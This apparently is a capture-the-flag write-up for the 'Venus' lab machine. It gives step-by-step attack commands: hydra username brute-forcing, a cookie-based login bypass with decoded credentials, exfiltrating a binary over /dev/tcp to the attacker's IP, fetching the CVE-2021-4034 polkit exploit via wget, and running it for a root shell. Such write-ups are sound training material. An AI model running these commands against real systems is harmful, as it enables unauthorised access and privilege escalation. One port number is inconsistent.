@@ -1,0 +1,127 @@
+VENUS CTF
+-----------------------
+*** lets find the ip of the target machine on our network ***
+
+--> netdiscover -r 10.0.2.0/24 [target IP is 10.0.2.8]
+
+*** do an nmap scan on the target ***
+
+--> nmap -p- -sV -sC -oN ven.txt 10.0.2.8
+
+*** we have port 22 running openssh and 8080 running http proxy ***
+*** try access the IP from the browser ***
+*** 10.0.2.8:8080 gives a webpage with a login prompt for user name and password. there is no ssl certificates ***
+*** nothing usable in the pagesource either ***
+*** check whether the webserver has any directories that can be exploited. ***
+
+--> dirb http://10.0.2.8:8080 [we have one result a directory called admin]
+
+*** switch over to admin page in the browser ***
+*** this has revealed yet another login page for django admin ***
+*** in the first login page when we try guest as user name and a random password we get invalid password error meaning guest is a user name ***
+*** using this info we can try finding other usernames with hydra ***
+
+--> hydra -L usernames.txt -p guest -s 8080 10.0.2.8 http-post-form "/:username=^USER^&password^PASS^&Login=Login:Invalid username."
+
+*** we have 3 usernames now guest, venus and magellan ***
+*** we need to find the password for venus and magellan ***
+*** the login form is not suceptible to any SQL injection attack as common detection techniques failed. but the username password sent to the server
+	is a combination like base64(username:rot13(password)). the way the username password combo is being authencited is flawed because if we just
+	send the base64 encoded username by editing the get request the service would allow us to login. using this principle we send base64 encoded
+	user name magellan and get the following output from the authentication cookie "bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ==". we need to decode this
+	we know that the password is also encoded. we can use cyber chef to figure out which encoding. ***
+	
+--> magellan:irahfvnatrbybtl1989 [decoded base64 value]
+
+*** use cyberchef to crack the encoding
+
+--> venusiangeology4212 or venusiangeology1989
+
+*** try ssh into the mercury box using magellan and the new password ***
+
+*** user flag user_flag_e799a60032068b27b8ff212b57c200b0 ****
+*** going through the directories we are unable to find any file that might give us a clue into gaining root access ***
+*** Try and check if we missed some service running on some other port other than the ones we found in our nmap scan we can do a dump of the sockets
+	runing on the target. sockets enable communication ***
+	
+--> ss -pnta
+
+*** we find a file called venus_messaging. it looks to be gibberish we can use the strings command to extract readable strings from the file ***
+
+--> strings /usr/bin/venus_messaging [we see a word called loveandbeauty. this could be a potential password]
+
+*** try the string for sudo first. this failed so it is not the sudo password ***
+*** lets see what service is running on the localsystem (venus) on port 9080 ***
+
+--> nc localhost 9080 [this takes us to venus messaging service which accepts the password loveandbeauty][NON-SSL HTTP Port]
+*** port 9080 often runs webservers that do not use port 80, like ibm websphere WSI (client to server). used for accessing webpages that ustilize
+    nonstandard ports ***
+
+*** now we are able to send messages to venus but still dont have root access ***
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+*** try sending messages of different lengths to see if there is weakness in the messaging system and it crashes. note the number of bytes being sent ***
+*** 500 ok
+	1000 ok
+	1500 ok
+	2000 -- looks like messaging system hung up at 2000 bytes. could be a buffer over flow issue. ***
+	
+Buffer Overflow Exploit 
+-----------------------------
+***Check whether the ALSR bit is disabled on the target.***
+
+*** Address space layout randomization (ASLR) is a memory-protection process for operating systems (OSes) that guards against buffer-overflow attacks
+	by randomizing the location where system executables are loaded into memory. ASLR can take the values 0, 1, and 2 ***
+
+--> cat /proc/sys/kernel/randomize_va_space [0]
+
+*** move venus_messaging file into our local system for analysis ***
+
+--> nc -lvnp 3333 > venus_messaging [on a new terminal in kali]
+--> cat /usr/bin/venus_messaging > /dev/tcp/10.0.2.9/333
+
+*** use the gnu debugger to debug the venus_messaging file ***
+
+--> gdb venus_messaging
+--> checksec
+
+*** disable Address Space Layout Randomisation on our local system temporarily ***
+
+--> echo 0 > /proc/sys/kernel/randomize_va_space
+
+*** in order to find the point where the buffer overflows we need to send a payload through the venus_messaging service. 
+	Payload can bea set of characters ***
+	
+--> pattern_create 1500 patt [creates a pattern of 1500 characters in gdb]
+
+*** then run it in gdb ***
+
+--> run
+
+*** Open a new terminal and send messages from there in kali
+
+--> nc localhost 9080
+
+*** this opens up a connection between the venus_messaging service on our local system and the debugger. we can see that the program execution
+	has stopped with the error segmentation fault. ***
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+*** find files that magellan can run as a root user ***
+
+--> find / -perm -u=s -type f 2>/dev/null
+
+*** we can see that there are several files that magellan can runas root. of which the polkit files stand out as there is 
+	already a known expoit fir that >> 	CVE-2021-4034. git clone the vulnerability into the local machine and transfer it into
+	the /tmp folder in the target machine ***
+
+--> python3 -m http.server 8000 [http server started on local machine containing the directory]
+--> wget --recursive --no-parent http://10.0.2.9:8000/CVE-2021-4034 [Transfer the whole folder into the /tmp folder]
+--> cd /10.0.2.9\:8000/CVE-2021-4034
+--> chmod +x cve-2021-4034.sh
+--> make
+--> ./cve-2021-4034.sh
+
+*** this takes us into the root shell where we can find the root flag ***
+
+--> cd /root
+--> cat root_flag.txt
